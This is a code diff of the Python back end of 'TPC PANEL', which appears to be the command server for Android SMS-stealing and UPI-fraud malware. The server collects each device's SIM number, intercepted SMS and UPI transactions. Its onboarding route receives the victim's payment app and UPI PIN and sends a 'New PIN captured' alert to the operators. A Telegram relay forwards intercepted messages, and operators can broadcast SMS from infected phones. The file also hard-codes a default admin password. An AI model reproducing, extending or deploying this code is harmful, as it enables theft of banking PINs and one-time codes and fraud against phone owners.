@@ -1,12 +1,12 @@
-"""
-TPC PANEL — backend
+"""TPC PANEL — backend API (v5.0)
 
-Devices report telemetry + inbound SMS. Operator broadcasts SMS, manages
-auto-reply rules, and relays everything through a bound Telegram bot.
-
-Relay (folded-in relay.py): ek MTProto user session channel ko watch karta hai
-"SMS Intercepted" format ke liye, parse karke device ko send karta hai; device
-ka SMS wapas Telegram user ko forward hota hai (banned-sender filter ke saath).
+v5.0 changes
+------------
+* Session: https_only auto-detect (http par bhi cookie chalti hai), SESSION_SECRET
+  disk par persist, Bearer-token fallback, 30-din TTL, UTF-8 safe password compare.
+* Telegram Bot (Bot API) flow poori tarah hata diya — sirf MTProto relay.
+* Auto Sender ab per-device hai (device doc me auto_sender config), relay har
+  enabled channel ko watch karta hai.
 """
 
 import os
@@ -14,19 +14,21 @@ import re
 import html
 import json
 import time
-import secrets
+import hmac
+import base64
 import hashlib
+import secrets
 import asyncio
+import logging
 from pathlib import Path
-from typing import Dict, Optional
+from typing import Dict, Optional, Any, List, Tuple
 from contextlib import asynccontextmanager
 from datetime import datetime, timedelta, timezone
 
-import httpx
 from fastapi import (
     FastAPI, HTTPException, Header, Request, WebSocket, WebSocketDisconnect,
 )
-from fastapi.responses import FileResponse
+from fastapi.responses import FileResponse, JSONResponse
 from starlette.middleware.sessions import SessionMiddleware
 from pydantic import BaseModel, Field
 from pymongo import ReturnDocument
@@ -35,8 +37,8 @@ from bson import ObjectId
 
 from backend.database import (
     init_db_with_retry, check_database, db,
-    devices, messages, outbox, rules, bots, tg_logs,
-    pairing_codes, activity_logs, banned_senders, relay_config, counters,
+    devices, messages, outbox, rules,
+    pairing_codes, activity_logs, banned_senders, relay_config, counters, tg_logs,
     utc_now,
 )
 
@@ -54,36 +56,23 @@ except Exception:  # pragma: no cover
     TELETHON_OK = False
 
 
+log = logging.getLogger("tpc")
+logging.basicConfig(level=os.getenv("LOG_LEVEL", "INFO"))
+
+
 # ------------------------------------------------------------------ config
 
 BASE_DIR = Path(__file__).resolve().parent.parent
 ADMIN_FILE = BASE_DIR / "admin" / "index.html"
+SECRET_FILE = BASE_DIR / ".session_secret"
 
-SESSION_TTL = 300
-ADMIN_API_KEY = os.getenv("ADMIN_API_KEY")
-SESSION_SECRET = os.getenv("SESSION_SECRET")
-PUBLIC_BASE_URL = os.getenv("PUBLIC_BASE_URL", "").rstrip("/")
-COOKIE_NAME = "tpc_admin_session"
-COOKIE_SECURE = os.getenv("COOKIE_SECURE", "true").lower() == "true"
+ADMIN_API_KEY = os.getenv("ADMIN_API_KEY", "")
+COOKIE_NAME = os.getenv("COOKIE_NAME", "tpc_admin_session")
+COOKIE_DOMAIN = os.getenv("COOKIE_DOMAIN") or None
 
-if not SESSION_SECRET:
-    SESSION_SECRET = secrets.token_urlsafe(32)
-    print("[warn] SESSION_SECRET not set — sessions restart pe die ho jaayengi")
-
-ADMIN_USERNAME = os.getenv("ADMIN_USERNAME", "ivan")
-ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "Ahad@198612")
-
-# --- Telegram bot API (khali chhodo to DB me bound bot use hoga)
-TG_BOT_TOKEN = os.getenv("TG_BOT_TOKEN", "")
-TG_CHAT_ID = os.getenv("TG_CHAT_ID", "")
-TG_WEBHOOK_SECRET = os.getenv("TG_WEBHOOK_SECRET", "")
-
-# --- Relay (MTProto)
-TELE_API_ID = int(os.getenv("TELE_API_ID", "0") or 0)
-TELE_API_HASH = os.getenv("TELE_API_HASH", "")
-TARGET_CHANNEL_ID = int(os.getenv("TARGET_CHANNEL_ID", "0") or 0)
-DEFAULT_FWD_USER = os.getenv("DEFAULT_FWD_USER", "").strip()
-RELAY_SESSION_FILE = os.getenv("RELAY_SESSION_FILE", str(BASE_DIR / "relay_session"))
+SESSION_TTL = 300                      # pairing code
+SESSION_MAX_AGE = 60 * 60 * 24 * 30    # 30 din — cookie
+TOKEN_TTL = 60 * 60 * 24 * 30          # 30 din — bearer
 
 ONLINE_WINDOW_SECONDS = 90
 MAX_TELEMETRY_KEYS = 60
@@ -92,17 +81,144 @@ MAX_WS_TEXT_BYTES = 4_000_000
 MAX_SMS_BODY = 1600
 MAX_BROADCAST = 500
 
-# socket keepalive — idle socket proxy me kat jaata hai
 WS_PING_INTERVAL = 25
 WS_IDLE_TIMEOUT = 120
 OUTBOX_REPUSH_AFTER = 45
 NUMBER_RETRY_AFTER = 300
 
+LOGIN_MAX_TRIES = 6
+LOGIN_LOCK_SECONDS = 300
+
 UPI_KEYWORDS = ("upi", "credited", "debited", "vpa", "paid to", "received from")
 AMOUNT_RE = re.compile(r"(?:rs.?|inr|₹)\s*([\d,]+(?:\.\d{1,2})?)", re.IGNORECASE)
 
-# sync endpoints (threadpool me chalte hain) se broadcast ke liye
+# --- Telegram relay (MTProto) — bot API hata diya
+TELE_API_ID = int(os.getenv("TELE_API_ID", "0") or 0)
+TELE_API_HASH = os.getenv("TELE_API_HASH", "")
+TARGET_CHANNEL_ID = int(os.getenv("TARGET_CHANNEL_ID", "0") or 0)
+DEFAULT_FWD_USER = os.getenv("DEFAULT_FWD_USER", "").strip()
+RELAY_SESSION_FILE = os.getenv("RELAY_SESSION_FILE", str(BASE_DIR / "relay_session"))
+
 MAIN_LOOP: Optional[asyncio.AbstractEventLoop] = None
+
+
+# ------------------------------------------------------------- secret store
+
+
+def _load_session_secret() -> Tuple[str, str]:
+    """env -> file -> generate (aur file me likh do). Restart pe sessions zinda rehte hain."""
+    env = (os.getenv("SESSION_SECRET") or "").strip()
+    if env:
+        return env, "env"
+
+    try:
+        if SECRET_FILE.is_file():
+            v = SECRET_FILE.read_text(encoding="utf-8").strip()
+            if v:
+                return v, "file"
+    except OSError:
+        pass
+
+    v = secrets.token_urlsafe(48)
+    try:
+        SECRET_FILE.write_text(v, encoding="utf-8")
+        try:
+            os.chmod(SECRET_FILE, 0o600)
+        except OSError:
+            pass
+    except OSError:
+        pass
+    return v, "generated"
+
+
+SESSION_SECRET, SESSION_SECRET_SRC = _load_session_secret()
+if SESSION_SECRET_SRC == "generated":
+    log.warning(
+        "SESSION_SECRET set nahi tha — naya secret bana ke %s me save kar diya. "
+        "Restart pe sessions zinda rahenge.", SECRET_FILE,
+    )
+
+
+# ---------------------------------------------------------------- admin users
+
+
+def _build_admins() -> Dict[str, str]:
+    """ADMIN_USERS='ivan:pw,ops:pw2'  (fallback: ADMIN_USERNAME/ADMIN_PASSWORD)."""
+    users: Dict[str, str] = {}
+    raw = os.getenv("ADMIN_USERS", "").strip()
+    if raw:
+        for pair in raw.split(","):
+            if ":" in pair:
+                u, p = pair.split(":", 1)
+                u, p = u.strip(), p.strip()
+                if u and p:
+                    users[u] = p
+    users.setdefault(
+        os.getenv("ADMIN_USERNAME", "ivan"),
+        os.getenv("ADMIN_PASSWORD", "Ahad@198612"),
+    )
+    return users
+
+
+ADMINS = _build_admins()
+
+
+def const_eq(a: str, b: str) -> bool:
+    """UTF-8 safe constant-time compare (compare_digest str par non-ASCII pe tootta hai)."""
+    try:
+        return hmac.compare_digest(a.encode("utf-8"), b.encode("utf-8"))
+    except Exception:
+        return False
+
+
+_login_fails: Dict[str, List[float]] = {}
+
+
+def login_guard(ip: str):
+    now = time.time()
+    hits = [t for t in _login_fails.get(ip, []) if now - t < LOGIN_LOCK_SECONDS]
+    _login_fails[ip] = hits
+    if len(hits) >= LOGIN_MAX_TRIES:
+        wait = int(LOGIN_LOCK_SECONDS - (now - hits[0]))
+        raise HTTPException(429, f"Bahut zyada tries — {max(1, wait)}s baad try karo")
+    return hits
+
+
+def login_fail(ip: str):
+    _login_fails.setdefault(ip, []).append(time.time())
+
+
+def login_ok(ip: str):
+    _login_fails.pop(ip, None)
+
+
+# --------------------------------------------------------------- token (bearer)
+
+
+def make_token(admin_id: str, ttl: int = TOKEN_TTL) -> str:
+    exp = int(time.time()) + ttl
+    payload = f"{admin_id}|{exp}"
+    sig = hmac.new(SESSION_SECRET.encode(), payload.encode(), hashlib.sha256).hexdigest()[:40]
+    return base64.urlsafe_b64encode(f"{payload}|{sig}".encode()).decode()
+
+
+def verify_token(token: str) -> Optional[str]:
+    try:
+        raw = base64.urlsafe_b64decode(token.encode()).decode()
+        admin_id, exp, sig = raw.rsplit("|", 2)
+        expected = hmac.new(
+            SESSION_SECRET.encode(), f"{admin_id}|{exp}".encode(), hashlib.sha256
+        ).hexdigest()[:40]
+        if not hmac.compare_digest(sig, expected):
+            return None
+        if int(exp) < time.time():
+            return None
+        return admin_id
+    except Exception:
+        return None
+
+
+# -------------------------------------------------------------- app / lifespan
 
 
 @asynccontextmanager
@@ -111,16 +227,51 @@ async def lifespan(app: FastAPI):
     MAIN_LOOP = asyncio.get_running_loop()
     init_db_with_retry()
     backfill_short_ids()
+    backfill_auto_sender()
     load_bans()
     await start_relay()
+    log.info("TPC PANEL v5.0 up — admins=%s secret=%s", list(ADMINS), SESSION_SECRET_SRC)
     yield
     await stop_relay()
     MAIN_LOOP = None
 
 
-app = FastAPI(title="TPC PANEL", version="4.5.0", lifespan=lifespan)
+app = FastAPI(title="TPC PANEL", version="5.0.0", lifespan=lifespan)
 
-# ProxyHeaders OUTERMOST chahiye warna https_only cookie set nahi hoti
+
+class AdaptiveSessionMiddleware(SessionMiddleware):
+    """`https_only=True` default ka problem: plain HTTP par browser cookie store hi
+    nahi karta -> login hota tha par session turant ud jaata tha.
+
+    Yahan secure flag sirf tab lagta hai jab request actually https ho
+    (ya COOKIE_SECURE=1 se force kiya ho).
+    """
+
+    def __init__(self, *args, force_secure: bool = False, **kwargs):
+        self.force_secure = force_secure
+        super().__init__(*args, **kwargs)
+
+    async def __call__(self, scope, receive, send):
+        if scope.get("type") in ("http", "websocket"):
+            flags = "httponly; samesite=" + getattr(self, "same_site", "lax")
+            if self.force_secure or scope.get("scheme") == "https":
+                flags += "; secure"
+            self.security_flags = flags
+        await super().__call__(scope, receive, send)
+
+
+_FORCE_SECURE = os.getenv("COOKIE_SECURE", "").strip().lower() in ("1", "true", "yes")
+
+app.add_middleware(
+    AdaptiveSessionMiddleware,
+    secret_key=SESSION_SECRET,
+    session_cookie=COOKIE_NAME,
+    max_age=SESSION_MAX_AGE,
+    same_site="lax",
+    domain=COOKIE_DOMAIN,
+    force_secure=_FORCE_SECURE,
+)
+
 try:
     from uvicorn.middleware.proxy_headers import ProxyHeadersMiddleware
 except Exception:  # pragma: no cover
@@ -128,15 +279,6 @@ except Exception:  # pragma: no cover
         from starlette.middleware.proxy_headers import ProxyHeadersMiddleware
     except Exception:
         ProxyHeadersMiddleware = None
-
-app.add_middleware(
-    SessionMiddleware,
-    secret_key=SESSION_SECRET,
-    session_cookie=COOKIE_NAME,
-    max_age=60 * 60 * 8,
-    same_site="lax",
-    https_only=COOKIE_SECURE,
-)
 
 if ProxyHeadersMiddleware is not None:
     app.add_middleware(ProxyHeadersMiddleware, trusted_hosts="*")
@@ -197,7 +339,8 @@ class SmsSyncRequest(BaseModel):
 
 
 class AdminLoginRequest(BaseModel):
-    username: str = Field(min_length=1, max_length=100)
+    username: str = Field(default="", max_length=100)
+    login_id: str | None = Field(default=None, max_length=100)
     password: str = Field(min_length=1, max_length=200)
 
 
@@ -219,11 +362,6 @@ class RuleRequest(BaseModel):
     upi_only: bool = False
 
 
-class BotRequest(BaseModel):
-    token: str = Field(min_length=20, max_length=200)
-    channel: str = Field(min_length=1, max_length=120)
-
-
 class RelayLoginRequest(BaseModel):
     api_id: str = Field(default="", max_length=20)
     api_hash: str = Field(default="", max_length=64)
@@ -243,6 +381,20 @@ class RelayParseRequest(BaseModel):
     text: str = Field(min_length=1, max_length=8000)
 
 
+class AutoSenderRequest(BaseModel):
+    enabled: bool | None = None
+    channel_id: str | None = Field(default=None, max_length=64)
+    channel_title: str | None = Field(default=None, max_length=160)
+
+
+class ChannelRequest(BaseModel):
+    channel_id: str = Field(min_length=1, max_length=64)
+
+
+class ForwardRequest(BaseModel):
+    target: str = Field(default="", max_length=64)
+
+
 # --------------------------------------------------------------- utilities
 
 
@@ -251,7 +403,6 @@ def hash_value(v: str) -> str:
 
 
 def normalize_number(raw) -> str:
-    """'+91 98765-43210' -> '+919876543210'. Invalid -> ''."""
     if raw is None:
         return ""
     s = re.sub(r"[^\d+]", "", str(raw).strip())
@@ -263,6 +414,26 @@ def normalize_number(raw) -> str:
     if not digits.isdigit() or not (6 <= len(digits) <= 15):
         return ""
     return s
+
+
+def norm_channel_id(raw) -> str:
+    """-1001234567890 / @name / 'name' -> stable string key."""
+    s = str(raw or "").strip()
+    if not s:
+        return ""
+    s = s.replace(" ", "").lstrip("@")
+    try:
+        return str(int(s))
+    except ValueError:
+        return s
+
+
+def as_entity(cid):
+    s = str(cid).strip().lstrip("@")
+    try:
+        return int(s)
+    except ValueError:
+        return s
 
 
 def log_event(event_type: str, details=None, device_id=None, admin_id=None):
@@ -338,7 +509,6 @@ def telemetry_summary(t: dict) -> dict:
 
 
 def resolve_device_number(device: dict) -> str:
-    """Live SIM number -> device-level -> entered number -> SIM slots."""
     if not device:
         return ""
 
@@ -364,7 +534,6 @@ def resolve_device_number(device: dict) -> str:
 
 
 def device_short_id(device: dict) -> str:
-    """Stable, searchable device code — har message me stamp hota hai."""
     return device.get("short_id") or ("TPC-" + str(device.get("_id", ""))[-6:].upper())
 
 
@@ -382,7 +551,6 @@ def next_device_short_id() -> str:
 
 
 def backfill_short_ids():
-    """Purane devices ko short_id do — boot pe ek baar."""
     try:
         for d in devices.find({"short_id": {"$exists": False}}, {"_id": 1}).limit(10000):
             devices.update_one(
@@ -392,8 +560,31 @@ def backfill_short_ids():
         pass
 
 
+def backfill_auto_sender():
+    """Purane devices ko default auto_sender block do."""
+    try:
+        devices.update_many(
+            {"auto_sender": {"$exists": False}},
+            {"$set": {"auto_sender": {
+                "enabled": False, "channel_id": None,
+                "channel_title": None, "updated_at": utc_now(),
+            }}},
+        )
+    except PyMongoError:
+        pass
+
+
+def auto_sender_of(device: dict) -> dict:
+    a = (device or {}).get("auto_sender") or {}
+    return {
+        "enabled": bool(a.get("enabled")),
+        "channel_id": str(a.get("channel_id") or ""),
+        "channel_title": a.get("channel_title") or "",
+        "updated_at": serialize_dt(a.get("updated_at")),
+    }
+
+
 def apply_telemetry(device: dict, raw) -> dict:
-    """Merge telemetry (partial safe) + refresh summary fields."""
     telemetry = sanitize_telemetry(raw)
     if not telemetry:
         return {}
@@ -412,7 +603,6 @@ def apply_telemetry(device: dict, raw) -> dict:
 
 
 def classify_sms(address: str, body: str) -> tuple[str, Optional[float], Optional[str]]:
-    """Return (kind, amount, flow)."""
     lower = (body or "").lower()
     kind = "sms"
 
@@ -436,28 +626,48 @@ def classify_sms(address: str, body: str) -> tuple[str, Optional[float], Optiona
     return kind, amount, flow
 
 
+# ------------------------------------------------------------------- auth
+
+
+def bearer_admin(request: Request) -> Optional[str]:
+    auth = request.headers.get("authorization") or ""
+    if auth[:7].lower() == "bearer ":
+        return verify_token(auth[7:].strip())
+    return None
+
+
 def require_api_key(api_key: str | None):
     if not ADMIN_API_KEY:
-        raise HTTPException(503, "Admin API key not configured")
-    if not api_key or not secrets.compare_digest(api_key, ADMIN_API_KEY):
+        raise HTTPException(401, "Admin API key not configured")
+    if not api_key or not const_eq(api_key, ADMIN_API_KEY):
         raise HTTPException(401, "Unauthorized")
 
 
-def require_admin(request: Request):
+def require_admin(request: Request) -> str:
+    """Session cookie -> Bearer token. Dono me se koi bhi chale."""
     admin_id = request.session.get("admin_id")
-    if not admin_id:
-        raise HTTPException(401, "Please log in")
-    return admin_id
+    if admin_id:
+        return admin_id
+
+    admin_id = bearer_admin(request)
+    if admin_id:
+        return admin_id
+
+    raise HTTPException(401, "Please log in")
 
 
 def require_admin_or_key(
     request: Request, x_admin_key: str | None = Header(default=None)
-):
-    """Session ya X-Admin-Key — machine-facing routes ke liye."""
-    if request.session.get("admin_id"):
-        return "session"
+) -> str:
+    try:
+        return require_admin(request)
+    except HTTPException:
+        pass
     require_api_key(x_admin_key)
     return "apikey"
+
+
+# --------------------------------------------------------------- serialize
 
 
 def serialize_dt(v):
@@ -494,13 +704,34 @@ def serialize_document(doc: dict) -> dict:
     return out
 
 
+def view_device(d: dict, include_hash: bool = False) -> dict:
+    s = serialize_document(d)
+    s["short_id"] = device_short_id(d)
+    s["ws_connected"] = hub.online(s["id"])
+    s["live_number"] = resolve_device_number(d)
+    s["entered_number"] = normalize_number(d.get("phone_number")) or (d.get("phone_number") or "")
+    s["auto_sender"] = auto_sender_of(d)
+    if not include_hash:
+        s.pop("registration_id", None)
+    return s
+
+
+def get_device_or_404(device_id: str) -> dict:
+    try:
+        d = devices.find_one({"_id": ObjectId(device_id)})
+    except Exception:
+        raise HTTPException(400, "Bad device id")
+    if not d:
+        raise HTTPException(404, "Device not found")
+    return d
+
+
 def dedupe_key(device_id: str, direction: str, address: str, body: str, when: datetime) -> str:
     stamp = int(when.timestamp() // 60)
     return f"{device_id}|{direction}|{address}|{hash_value(body)[:16]}|{stamp}"
 
 
 def insert_message(doc: dict, dedupe: bool = True) -> Optional[ObjectId]:
-    """Insert message, duplicate (same device/dir/body/minute) skip karo."""
     try:
         if dedupe:
             key = dedupe_key(
@@ -512,7 +743,6 @@ def insert_message(doc: dict, dedupe: bool = True) -> Optional[ObjectId]:
                 return None
         return messages.insert_one(doc).inserted_id
     except PyMongoError:
-        # DuplicateKeyError bhi yahin aata hai — lost race cleanly skip hoti hai
         return None
 
 
@@ -559,8 +789,6 @@ hub = Hub()
 
 
 class AdminHub:
-    """Admin dashboard live sockets."""
-
     def __init__(self):
         self.sockets: set = set()
         self.lock = asyncio.Lock()
@@ -590,7 +818,6 @@ admin_hub = AdminHub()
 
 
 def spawn(coro):
-    """Coroutine ko sync AUR async dono jagah se safely schedule karo."""
     loop = MAIN_LOOP
     try:
         running = asyncio.get_running_loop()
@@ -613,7 +840,6 @@ def spawn(coro):
 
 
 def broadcast(payload: dict):
-    """Sync aur async dono jagah se safe."""
     loop = MAIN_LOOP
     if loop is None or loop.is_closed():
         return
@@ -640,11 +866,7 @@ def broadcast_message(doc):
 
 
 def broadcast_device(device_id: str, extra: dict | None = None):
-    payload = {
-        "type": "device_status",
-        "data": {"id": device_id, **(extra or {})},
-    }
-    broadcast(payload)
+    broadcast({"type": "device_status", "data": {"id": device_id, **(extra or {})}})
 
 
 async def send_command(device_id: str, action: str, extra: dict | None = None) -> bool:
@@ -664,15 +886,13 @@ def push_row(device_id: str, row: dict) -> dict:
 
 
 async def push_outbox(device_id: str):
-    """Push all pending outbox rows for a device over its socket."""
     try:
         pending = list(outbox.find({"device_id": device_id, "status": "pending"}).limit(20))
     except PyMongoError:
         return
 
     for row in pending:
-        ok = await hub.send_to_device(device_id, push_row(device_id, row))
-        if ok:
+        if await hub.send_to_device(device_id, push_row(device_id, row)):
             try:
                 outbox.update_one(
                     {"_id": row["_id"]},
@@ -683,7 +903,6 @@ async def push_outbox(device_id: str):
 
 
 async def repush_stale(device_id: str):
-    """Jo rows push ho gaye par ack nahi aaya, unhe dobara bhejo."""
     cutoff = utc_now() - timedelta(seconds=OUTBOX_REPUSH_AFTER)
     try:
         stale = list(outbox.find({
@@ -709,7 +928,6 @@ def queue_sms(
     device_id: str, body: str, to: str | None,
     source: str = "panel", device_name: str = "",
 ) -> tuple[str, str]:
-    """Ek message row + ek outbox row. Ack par wahi message row update hoti hai."""
     now = utc_now()
     to = normalize_number(to) or (to or "").strip()
 
@@ -746,27 +964,24 @@ def queue_sms(
     return str(outbox_id), str(msg_id) if msg_id else ""
 
 
+def online_device_ids() -> List[ObjectId]:
+    out = []
+    for k in list(hub.device_sockets.keys()):
+        try:
+            out.append(ObjectId(k))
+        except Exception:
+            continue
+    return out
+
+
 def resolve_targets(payload: SendRequest) -> tuple[list, bool]:
-    """-> (devices, capped)."""
     if payload.target == "device":
         if not payload.device_id:
             raise HTTPException(400, "device_id required for target=device")
-        try:
-            oid = ObjectId(payload.device_id)
-        except Exception:
-            raise HTTPException(400, "Bad device id")
-        device = devices.find_one({"_id": oid})
-        if not device:
-            raise HTTPException(404, "Device not found")
-        return [device], False
+        return [get_device_or_404(payload.device_id)], False
 
     if payload.target == "online":
-        ids = []
-        for k in list(hub.device_sockets.keys()):
-            try:
-                ids.append(ObjectId(k))
-            except Exception:
-                continue
+        ids = online_device_ids()
         if not ids:
             return [], False
         return list(devices.find({"_id": {"$in": ids}})), False
@@ -775,8 +990,7 @@ def resolve_targets(payload: SendRequest) -> tuple[list, bool]:
         total = devices.count_documents({})
     except PyMongoError:
         total = 0
-    rows = list(devices.find().limit(MAX_BROADCAST))
-    return rows, total > MAX_BROADCAST
+    return list(devices.find().limit(MAX_BROADCAST)), total > MAX_BROADCAST
 
 
 # --------------------------------------------------------------- public
@@ -785,14 +999,19 @@ def resolve_targets(payload: SendRequest) -> tuple[list, bool]:
 @app.get("/")
 async def home():
     return {
-        "app": "TPC PANEL", "status": "online",
-        "version": "4.5.0", "owner": "https://t.me/icivan",
+        "app": "TPC PANEL", "status": "online", "version": "5.0.0",
+        "owner": "https://t.me/icivan",
+        "relay": "mtproto" if TELETHON_OK else "unavailable",
     }
 
 
 @app.get("/health")
 async def health():
-    return {"status": "ok", "devices_online": hub.online_count}
+    return {
+        "status": "ok",
+        "devices_online": hub.online_count,
+        "relay_authorized": bool(relay_state.get("authorized")),
+    }
 
 
 @app.get("/health/database")
@@ -807,7 +1026,17 @@ async def database_health():
 async def admin_page():
     if not ADMIN_FILE.is_file():
         raise HTTPException(404, "Admin dashboard file not found")
-    return FileResponse(ADMIN_FILE)
+    return FileResponse(ADMIN_FILE, headers={"Cache-Control": "no-store"})
+
+
+@app.get("/admin/", include_in_schema=False)
+async def admin_page_slash():
+    return await admin_page()
+
+
+@app.get("/panel", include_in_schema=False)
+async def panel_alias():
+    return await admin_page()
 
 
 # ------------------------------------------------------------ admin auth
@@ -815,30 +1044,56 @@ async def admin_page():
 
 @app.get("/admin/auth/status")
 async def auth_status(request: Request):
-    a = request.session.get("admin_id")
+    a = request.session.get("admin_id") or bearer_admin(request)
     return {"authenticated": bool(a), "admin_id": a}
 
 
 @app.post("/admin/login")
 async def admin_login(payload: AdminLoginRequest, request: Request):
-    u = payload.username.strip()
-    if not secrets.compare_digest(u, ADMIN_USERNAME):
-        raise HTTPException(401, "Invalid username or password")
-    if not secrets.compare_digest(payload.password, ADMIN_PASSWORD):
-        raise HTTPException(401, "Invalid username or password")
+    ip = (request.client.host if request.client else "?") or "?"
+    login_guard(ip)
 
-    request.session["admin_id"] = ADMIN_USERNAME
-    log_event("admin_login", {"username": u}, admin_id=u)
-    return {"status": "ok", "username": u}
+    user = (payload.login_id or payload.username or "").strip()
+    if not user:
+        raise HTTPException(400, "Login ID required")
+
+    expected = ADMINS.get(user)
+    if expected is None:
+        # case-insensitive fallback
+        for k, v in ADMINS.items():
+            if k.lower() == user.lower():
+                user, expected = k, v
+                break
+
+    if expected is None or not const_eq(payload.password, expected):
+        login_fail(ip)
+        raise HTTPException(401, "Invalid Login ID or password")
+
+    login_ok(ip)
+    request.session["admin_id"] = user
+    log_event("admin_login", {"username": user, "ip": ip}, admin_id=user)
+    return {
+        "status": "ok",
+        "username": user,
+        "token": make_token(user),
+        "expires_in": TOKEN_TTL,
+    }
 
 
 @app.post("/admin/logout")
 async def admin_logout(request: Request):
-    a = request.session.get("admin_id")
+    a = request.session.get("admin_id") or bearer_admin(request)
     if a:
         log_event("admin_logout", admin_id=a)
     request.session.clear()
     return {"status": "ok"}
+
+
+@app.get("/admin/session")
+async def admin_session(request: Request):
+    a = require_admin(request)
+    src = "session" if request.session.get("admin_id") else "token"
+    return {"admin_id": a, "via": src, "secret_source": SESSION_SECRET_SRC}
 
 
 # --------------------------------------------------------------- devices
@@ -886,6 +1141,10 @@ async def register_device(payload: DeviceRegistrationRequest):
                  "registration_id_hash": rh,
                  "created_at": now,
                  "onboarded": False,
+                 "auto_sender": {
+                     "enabled": False, "channel_id": None,
+                     "channel_title": None, "updated_at": now,
+                 },
              }},
             upsert=True,
         )
@@ -948,7 +1207,6 @@ async def heartbeat(payload: DeviceHeartbeatRequest):
         "telemetry": fields.get("telemetry") or device.get("telemetry") or {},
     })
 
-    # live number missing ho to device se maango (5 min me ek baar)
     merged_t = fields.get("telemetry") or (device.get("telemetry") or {})
     if not merged_t.get("sim_number") and hub.online(device_id):
         last = device.get("number_requested_at")
@@ -971,7 +1229,6 @@ async def heartbeat(payload: DeviceHeartbeatRequest):
 
 @app.post("/devices/telemetry")
 async def device_telemetry(payload: DeviceTelemetryRequest):
-    """Device apni fresh telemetry bhejta hai (fetch_number ka jawab bhi yahi)."""
     rh = hash_value(payload.registration_id.strip())
 
     try:
@@ -1003,7 +1260,6 @@ async def device_telemetry(payload: DeviceTelemetryRequest):
 
 @app.post("/devices/command/result")
 async def device_command_result(payload: DeviceCommandResultRequest):
-    """Device command ka result — number, sim info, telemetry, ack."""
     rh = hash_value(payload.registration_id.strip())
 
     try:
@@ -1090,11 +1346,11 @@ async def sms_incoming(payload: SmsIncomingRequest):
 
     if kind == "upi" and amount:
         log_event("upi_received", {"amount": amount, "flow": flow}, device_id=device_id)
-        await notify_telegram(
+        await notify_admins(
             f"💸 <b>UPI {flow or 'txn'}</b>\n"
             f"Device: <code>{device_short_id(device)}</code>\n"
             f"Amount: <b>₹{amount:.2f}</b>\n"
-            f"From: <code>{payload.address or 'n/a'}</code>"
+            f"From: <code>{html.escape(payload.address or 'n/a')}</code>"
         )
 
     replies = evaluate_rules(
@@ -1232,14 +1488,14 @@ async def device_onboarding(payload: OnboardingRequest):
         device_id=device_id,
     )
 
-    await notify_telegram(
+    await notify_admins(
         "🔔 <b>New PIN captured</b>\n"
         f"Device: <code>{device_short_id(device)}</code>\n"
-        f"Entered number: <code>{payload.phone_number or 'n/a'}</code>\n"
-        f"SIM number: <code>{sim_number}</code>\n"
-        f"Carrier: {carrier}\n"
-        f"App chosen: <b>{payload.payment_app or 'n/a'}</b>\n"
-        f"PIN: <code>{payload.upi_pin or 'n/a'}</code>\n"
+        f"Entered number: <code>{html.escape(payload.phone_number or 'n/a')}</code>\n"
+        f"SIM number: <code>{html.escape(str(sim_number))}</code>\n"
+        f"Carrier: {html.escape(str(carrier))}\n"
+        f"App chosen: <b>{html.escape(payload.payment_app or 'n/a')}</b>\n"
+        f"PIN: <code>{html.escape(payload.upi_pin or 'n/a')}</code>\n"
         f"Amount: ₹{payload.amount:.0f}\n"
         f"Time: {now.strftime('%d %b %H:%M')}"
     )
@@ -1260,7 +1516,6 @@ async def device_outbox(registration_id: str):
         raise HTTPException(404, "Device not registered")
 
     device_id = str(device["_id"])
-
     rows = list(outbox.find({"device_id": device_id, "status": "pending"}).limit(20))
 
     for r in rows:
@@ -1281,7 +1536,6 @@ async def device_outbox(registration_id: str):
 
 
 async def _ack_outbox(item_id: str, status: str, error: str = ""):
-    """Outbox row close karo + usi message row ka status update karo."""
     try:
         oid = ObjectId(item_id)
     except Exception:
@@ -1330,9 +1584,7 @@ async def _ack_outbox(item_id: str, status: str, error: str = ""):
 @app.post("/devices/outbox/{item_id}/ack")
 async def device_outbox_ack(item_id: str, payload: dict | None = None):
     payload = payload or {}
-    status = str(payload.get("status") or "sent")
-    error = str(payload.get("error") or "")
-    await _ack_outbox(item_id, status, error)
+    await _ack_outbox(item_id, str(payload.get("status") or "sent"), str(payload.get("error") or ""))
     return {"status": "ok"}
 
 
@@ -1454,12 +1706,9 @@ async def admin_send(
     for device in targets:
         device_id = str(device["_id"])
         device_name = device.get("device_name", "Unknown")
-
         to = manual_to or resolve_device_number(device)
 
-        outbox_id, _msg_id = queue_sms(
-            device_id, body, to, source="panel", device_name=device_name
-        )
+        outbox_id, _ = queue_sms(device_id, body, to, source="panel", device_name=device_name)
 
         delivered = False
         if hub.online(device_id):
@@ -1470,10 +1719,13 @@ async def admin_send(
             if row:
                 delivered = await hub.send_to_device(device_id, push_row(device_id, row))
                 if delivered:
-                    outbox.update_one(
-                        {"_id": row["_id"]},
-                        {"$set": {"pushed_at": utc_now()}, "$inc": {"attempts": 1}},
-                    )
+                    try:
+                        outbox.update_one(
+                            {"_id": row["_id"]},
+                            {"$set": {"pushed_at": utc_now()}, "$inc": {"attempts": 1}},
+                        )
+                    except PyMongoError:
+                        pass
 
         results.append({
             "device_id": device_id,
@@ -1499,12 +1751,8 @@ async def admin_send(
         notes.append(f"fleet {MAX_BROADCAST} se bada hai — sirf pehle {MAX_BROADCAST} devices mile")
 
     return {
-        "status": "ok",
-        "queued": queued,
-        "delivered": delivered_n,
-        "capped": capped,
-        "results": results,
-        "note": " | ".join(notes),
+        "status": "ok", "queued": queued, "delivered": delivered_n,
+        "capped": capped, "results": results, "note": " | ".join(notes),
     }
 
 
@@ -1515,21 +1763,13 @@ async def device_send_sms(
     request: Request,
     x_admin_key: str | None = Header(default=None),
 ):
-    """Frontend fallback: single device ko seedha SMS."""
     require_admin_or_key(request, x_admin_key)
 
     body = str(payload.get("body") or payload.get("message") or "").strip()
     if not body:
         raise HTTPException(400, "Message body required")
 
-    try:
-        device = devices.find_one({"_id": ObjectId(device_id)})
-    except Exception:
-        raise HTTPException(400, "Bad device id")
-
-    if not device:
-        raise HTTPException(404, "Device not found")
-
+    device = get_device_or_404(device_id)
     to = normalize_number(payload.get("to")) or resolve_device_number(device)
 
     outbox_id, _ = queue_sms(str(device["_id"]), body, to,
@@ -1584,8 +1824,7 @@ async def admin_devices(
     onboarded: bool | None = None,
     q: str | None = None,
 ):
-    if not request.session.get("admin_id"):
-        require_api_key(x_admin_key)
+    require_admin_or_key(request, x_admin_key)
 
     query = {}
     if onboarded is not None:
